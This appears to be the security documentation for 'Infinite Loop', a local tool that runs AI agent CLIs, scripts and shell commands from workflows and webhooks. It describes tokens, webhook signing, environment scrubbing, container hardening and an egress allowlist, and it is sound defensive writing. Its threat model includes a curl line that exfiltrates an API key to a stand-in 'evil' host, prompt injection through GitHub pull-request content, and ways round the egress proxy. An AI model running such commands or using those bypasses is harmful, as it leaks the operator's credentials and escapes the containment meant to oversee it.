# Security model

Infinite Loop is a developer tool that runs **on your machine** and can execute:

- Local agent CLIs (`claude`, `codex`, anything you register as a provider).
- Inline TypeScript and Python (Script nodes).
- Shell commands (Condition nodes with `kind: command`).
- Workflows queued by inbound webhooks.

That power means it should be treated like a local code execution surface, not a typical web app.

## Default network posture

Out of the box `server.ts` binds to `127.0.0.1` (loopback), so the console is reachable **only from this machine**. This is the fail-closed default: no token is needed because nothing off-host can connect.

To reach the console from other machines you must bind a network address (`HOST=0.0.0.0` or a specific LAN IP). Because **anyone who can reach the port can also run your workflows** — including the shell-condition and script nodes — the server will **refuse to start** when bound to a network address with no `INFLOOP_API_TOKEN`. You then have two choices:

- **Recommended — require a token** (see [Authenticated mode](#authenticated-mode) below):

  ```bash
  INFLOOP_API_TOKEN=$(openssl rand -hex 32) HOST=0.0.0.0 bun run start
  ```

- **Acknowledge the risk** and run unauthenticated on a trusted network:

  ```bash
  INFLOOP_ALLOW_INSECURE=1 HOST=0.0.0.0 bun run start
  ```

  This starts the server but prints a loud insecure-mode banner. Anyone on the network can execute arbitrary code on this machine — only do this on a network you fully trust.

## Authenticated mode

Set `INFLOOP_API_TOKEN` to require authentication on every `/api/*` call
(webhook ingress is the one exception — see below):

```bash
INFLOOP_API_TOKEN=$(openssl rand -hex 32) bun run start
```

In this mode:

- **The browser UI keeps working.** Visiting the console redirects to a login
  page; enter the token once and the server sets an `httpOnly`,
  `SameSite=Strict` session cookie, after which the console behaves normally.
- **MCP / API / scripted clients** keep authenticating with
  `Authorization: Bearer <token>` — unchanged.
- The session cookie value is a SHA-256 hash of the token, not the token
  itself: a leaked cookie cannot be replayed as the bearer credential and
  never exposes the literal `INFLOOP_API_TOKEN`. It is still a bearer
  credential for *this* server, though — a stolen cookie grants full access
  until the token is rotated, so treat it like a password.
- The session is stateless (no server-side store): it survives a server
  restart, and rotating `INFLOOP_API_TOKEN` invalidates every issued cookie
  immediately.
- The cookie is marked `Secure` automatically when a reverse proxy reports
  HTTPS via `X-Forwarded-Proto`; over plain HTTP it is not, because a `Secure`
  cookie would never be stored.
- The token is compared in constant time but is otherwise a plain shared
  secret — rotate it like a password.

This is a single-tenant model: one shared token, no per-user accounts.

## Webhooks

The unguessable `triggerId` in a webhook URL is the base credential.

- Treat webhook URLs like passwords. Don't paste them in shared docs or screenshots.
- Rotate via the regenerate-id button in the Dispatch form.
- `INFLOOP_API_TOKEN` does **not** apply to webhook ingress — external services like GitHub can't carry custom auth headers.

When a webhook plugin declares a signing scheme (e.g. GitHub's HMAC-SHA256), a trigger built on it is **signature-verified**: Infinite Loop recomputes the HMAC over the raw request body with the trigger's shared `secret` and rejects a missing or mismatched signature with `401`. Set the secret in the Dispatch form when you create the trigger. A trigger on a signing-capable plugin must either carry a secret or explicitly opt out with `verifyOptional: true` (accepts unsigned requests, logs a warning) — with neither set, the request is refused as misconfigured rather than silently trusted.

## Rate limiting

`INFLOOP_API_TOKEN` does not gate the two surfaces that most need it: webhook
ingress (external senders cannot carry a bearer header) and the browser login
form (it is what *issues* the credential). Both are rate-limited in-process as
a defense-in-depth control:

- **Webhook ingress** is limited per trigger (`INFLOOP_WEBHOOK_RATE_LIMIT`,
  default 120/min), so a leaked trigger URL cannot be hammered without limit.
  The bucket is keyed on the triggerId alone, so a flood also throttles that
  trigger's legitimate traffic — the real remedy for a leaked URL is to rotate
  it.
- **Browser login** is limited by a single global bucket
  (`INFLOOP_LOGIN_RATE_LIMIT`, default 20/min). Brute-forcing a 256-bit token
  is already infeasible; this caps the log, audit, and CPU churn a login flood
  can cause. A sustained flood can `429` the login form — the operator can
  still authenticate API/MCP calls with `Authorization: Bearer`, which is not
  behind this limiter.

Over the limit the response is `429` with a `Retry-After` header. The limiter
is in-memory and per-process: it resets on restart and a port-fallback second
instance keeps its own. It is a backstop, not a substitute for the proxy
below.

## Don't expose to the public internet

Infinite Loop has **no per-user auth** — one shared token, no accounts. Webhook ingress and browser login are rate-limited (see above) and trust-relevant events are recorded in an [audit log](#audit-log), but for a publicly reachable trigger surface you should still put Infinite Loop behind one of:

- A Cloudflare Tunnel with **Access policies** that gate inbound traffic.
- A Tailscale ACL-restricted host.
- A reverse proxy (Caddy / nginx) with HTTP auth and IP allow-lists.

Never punch a port mapping on your router straight to Infinite Loop.

## Workflow files are executable code

A `.workflow.json` file can:

- Run arbitrary shell commands via a Condition.
- Execute arbitrary TypeScript or Python via a Script node.
- Invoke any provider you have registered.

**Review every workflow you import or download before running it.** Treat them like you'd treat a Bash script from the internet.

The same applies to `providers/*.json`, `webhook-plugins/*.json`, and `triggers/*.json` — they all influence what Infinite Loop will execute or accept.

## Containment of executed code

Agent and Script nodes run **untrusted code** — AI-authored, and routinely
shaped by webhook payloads the server does not control (a GitHub
`pull_request` trigger feeds an attacker-supplied title, body, and diff
straight into an agent prompt). The settings below bound what that code can
reach. They limit *blast radius*; the network posture and `INFLOOP_API_TOKEN`
limit *who can ask*. Both matter.

### Scrubbed child environment

Spawned children do **not** inherit the server's environment. Each is given
an explicit allowlist:

- a small **base set** of non-secret, environment-shaping variables (`PATH`,
  `HOME`, locale, `TZ`, TLS/proxy config, …);
- the variables a provider manifest declares it needs in **`envPassthrough`**
  (the `claude` manifest passes `ANTHROPIC_*` and `CLAUDE_*`, for example);
- anything the operator opts into via **`INFLOOP_CHILD_ENV_PASSTHROUGH`**
  (comma-separated exact names or `PREFIX_*` wildcards) — the escape hatch
  for site-specific needs such as a Bedrock `AWS_*`, an `SSH_AUTH_SOCK`, or a
  Python virtualenv.

The entire **`INFLOOP_` namespace is never passed to a child** — most
importantly `INFLOOP_API_TOKEN`, the bearer token gating the whole API. A
prompt-injected agent can no longer `echo $INFLOOP_API_TOKEN` and exfiltrate
it.

This is a behavior change: a Script that relied on an inherited host variable
(a venv, a registry token) must now have it named in
`INFLOOP_CHILD_ENV_PASSTHROUGH`. A provider's child needs its credentials
named in the manifest `envPassthrough`.

### Opt-in dangerous permissions

The `claude` provider is **no longer shipped with
`--dangerously-skip-permissions` baked into its manifest**. By default an
agent runs the CLI with its normal permission posture; in non-interactive
mode that means it cannot perform tool calls that require approval (it logs a
`[permissions]` notice when this applies).

To grant full autonomous file / shell / network access, tick **"Skip
permission prompts (dangerous)"** on the Agent node — it maps to the
manifest's `dangerousArgs`, injected only for that node. Enable it only for
prompts you trust, and ideally only inside the sandboxed container below.

> Existing saved workflows are affected: a Claude agent node that previously
> ran fully autonomous now runs with prompts enabled until you opt back in.
> This is deliberate — autonomy is now a visible choice, not a silent
> default.

### The container is the security boundary

`docker-compose.yml` runs the app with a **read-only root filesystem**, all
Linux **capabilities dropped**, `no-new-privileges`, a `pids_limit`, and
writable state confined to named volumes and a `/tmp` tmpfs. Treat the
container as the containment unit for the untrusted code a run executes, and
do not bind-mount host directories into it by default.

The container needs egress (provider APIs, webhook responses), so it cannot
run `--network none`. To bound an *individual agent run's* network, see the
per-run egress allowlist below.

### Per-run egress allowlist

An Agent node spawns a provider CLI that runs untrusted, prompt-shaped code
with a real API credential in its environment — the manifest's `envPassthrough`
(`ANTHROPIC_*`, `OPENAI_*`), which scrubbing cannot strip without breaking the
provider. The risk is **exfiltration**: a prompt-injected agent running
`curl https://evil/ -d "$ANTHROPIC_API_KEY"`.

A CLI provider manifest can declare an **`egressAllowlist`** — the hostnames
its child legitimately needs, each an exact host or a leading-wildcard
(`*.anthropic.com`, matching any subdomain but **not** the apex). When the
operator sets **`INFLOOP_EGRESS_ENFORCE=1`**, the runner starts a per-run
filtering proxy bound to loopback, points the child's `HTTP(S)_PROXY` at it,
and the proxy permits CONNECT tunnels and plain-HTTP forwards **only** to
allowlisted hosts — everything else is refused with `403` and logged. The
proxy also resolves each host itself and refuses one that resolves to a
loopback, private, or link-local address (a DNS-rebinding / SSRF guard, so it
cannot be turned into a pivot to an internal service or a cloud metadata
endpoint) unless that exact IP is itself an allowlist entry. If the proxy
cannot start, the run **fails closed** rather than running unrestricted. The
shipped `claude` and `codex` manifests already declare allowlists for their
provider APIs.

This is **opt-in and off by default**: with `INFLOOP_EGRESS_ENFORCE` unset,
children spawn exactly as before. The exact endpoint set a CLI needs varies by
version, so enable enforcement deliberately and extend the allowlist for your
setup.

**What it is and isn't** — it catches every standard HTTP client that honours
`HTTP(S)_PROXY` (curl, wget, the provider CLIs, Python `requests`). It is
defense-in-depth, not a jail:

- Raw-socket code that ignores proxy env vars bypasses it.
- It does not stop exfiltration to an *allowlisted* host — an attacker can
  encode the key into a request to `api.anthropic.com` itself. It removes the
  *arbitrary-endpoint* channel and forces an attacker onto hosts you chose.
- It assumes direct outbound; chaining to a mandatory upstream corporate proxy
  is not supported.

For a stronger boundary, also run Infinite Loop on a network it cannot abuse.

### Per-run worktree isolation

New Agent nodes default to **"Run in isolated git worktree"**, so an agent
edits a fresh worktree off `cwd` rather than the working tree directly. This
is a correctness/isolation default, not a security boundary — the process
still shares the host's filesystem and network. Uncheck it for a `cwd` that
is not a git repository.

## Runaway protection

A workflow that loops without a real bound — an `infinite: true` Loop, or
nested loops that multiply — can keep invoking agents (and spending API
credits) until a human notices. Every run is therefore capped by a
**run-level budget**, independent of any per-loop `maxIterations`:

- `INFLOOP_MAX_RUN_NODE_EXECUTIONS` (default `10000`) — the maximum number of
  node-execution steps in a single run. When exceeded, the run is aborted and
  settles as **failed** with a budget message. `0` disables the ceiling.
- `INFLOOP_MAX_RUN_DURATION_MS` (default `86400000`, 24h) — a wall-clock cap,
  checked at each node-step boundary. A run that exceeds it is stopped at its
  next step; a single long-running node is not interrupted mid-flight. The
  default is a generous backstop against a genuinely-stuck run, not a tight
  SLA — long autonomous runs are expected. A run that legitimately needs more
  than 24h must raise this or set it to `0` (disabled).
- `INFLOOP_MAX_RUN_COST_USD` (default `0`, disabled) — a cumulative cost
  ceiling in US dollars. When set, the run is aborted and settles as
  **failed** once the total cost reported by its agents exceeds the cap. It is
  opt-in because no single dollar figure is safe for every user; set it to
  your real per-run budget.

A per-run cost cap does not bound a **webhook storm or a misconfigured
trigger** — each run can stay under its own cap while the fleet of them spends
without limit. The process-wide cost budget closes that:

- `INFLOOP_MAX_TOTAL_COST_USD` (default `0`, disabled) — a cumulative cost
  ceiling, in US dollars, across **every run since the process started**. Once
  cumulative provider-reported cost passes it, new runs are refused at
  admission (`POST /api/run` answers `503`) and any in-flight run is aborted at
  its next costed node. Queued trigger runs are **held, not dropped** — the
  queue drain pauses, leaving them on disk to resume after a restart (which
  also resets the in-memory total); a queued run was already acknowledged to
  its caller, so it is not silently discarded. Like the per-run cap it is
  opt-in — set it to your real budget. It is process-lifetime and in-memory: a
  restart resets the total to zero. For a windowed (e.g. daily) view, alert on
  the `infloop_run_cost_usd_total` metric instead — see
  [configuration.md](./configuration.md#metrics).

The node and wall-clock ceilings bound **every** run. The node ceiling is the
deterministic guard: an unbounded loop will always hit it. Raise the limit if
you have a legitimately large workflow — but treat a budget failure as a
prompt to add an explicit `maxIterations` cap, not just to raise the ceiling.

**Cost-cap coverage.** Both cost caps only count cost from providers that
report it — currently the `claude` CLI (via its `total_cost_usd` result
frame). HTTP providers report no cost, so a workflow built entirely on HTTP
providers is **not** bounded by either cost cap; the node and wall-clock
ceilings remain its backstop. The cost is also surfaced per agent node as the
`costUsd` output (usable in `{{ ... }}` templates).

## Crash recovery

The run-level budget only bounds spend while the server process is alive.
Provider CLIs are spawned in their own process group (`detached: true`) so a
per-run cancel can kill grandchildren — but the flip side is they do **not**
die with the server. A hard crash (OOM-kill, `kill -9`, power loss) skips the
graceful-shutdown handlers entirely, leaving every in-flight agent CLI running
as an orphan that keeps spending API credits, invisibly.

To close that gap, every detached child is recorded under `<data-dir>/pids/`
and every in-flight run leaves a marker under `<data-dir>/active-runs/`. On the
next start, before the HTTP server accepts traffic, Infinite Loop:

- kills any orphaned process groups left behind by the previous server, and
- records any run interrupted by the crash as **failed** in history, so it is
  not silently lost.

A normal Ctrl+C shutdown reaps children directly and leaves nothing to
recover. Recovery is also instance-aware: when two servers run at once (port
fallback), one never reaps the other's live children or runs.

## Audit log

Infinite Loop runs unattended — triggered by webhooks and MCP when nobody is
watching the console. A proxy in front of the app can supply per-user identity
and access logs, but it can never see *what the app did*: which workflow ran,
which trigger was created or deleted, which login attempt failed, which
webhook was accepted or rejected. Only the app knows that.

So every trust-relevant event is written to a durable, append-only audit log
at `<data-dir>/audit/audit.jsonl` — one JSON object per line, the moment it
happens. It covers:

- **run lifecycle** — a run starting and settling, including runs reconciled
  as failed after a crash;
- **auth** — login successes and failures, and logout;
- **triggers** — every create, update, and delete via the API;
- **webhooks** — each request to a real trigger that is accepted or rejected
  (bad signature, queue full, misconfigured, invalid inputs).

Unlike run history — capped per workflow and pruned — the audit log is bounded
only by a generous size-based rotation (`INFLOOP_AUDIT_MAX_BYTES` /
`INFLOOP_AUDIT_MAX_FILES`), so it retains months of events. Entries record a
coarse actor (`api-token`, `browser-session`, `webhook`, `system`, `open`) but
never a secret — no tokens, no trigger secrets, no request bodies. Read it
back through the authenticated `GET /api/audit` endpoint.

Each entry caused by an ingress event — a webhook, an API run, an MCP enqueue
— also carries a **`correlationId`** (`cid_…`). The same id is stamped on the
run's events and its history record, so one `grep cid_…` walks the whole
chain: webhook accept → queued run → run start → run finish. The ingress
response returns the id in its body and in an `x-correlation-id` header.

The log shares the data directory's trust boundary: it is not tamper-proofed,
because a local attacker who can rewrite it can already rewrite everything
else on the machine.

## Reporting security issues

Infinite Loop is pre-1.0 and currently has no formal disclosure channel. Open a GitHub issue for non-sensitive concerns; for anything that warrants private disclosure, contact the maintainer directly.
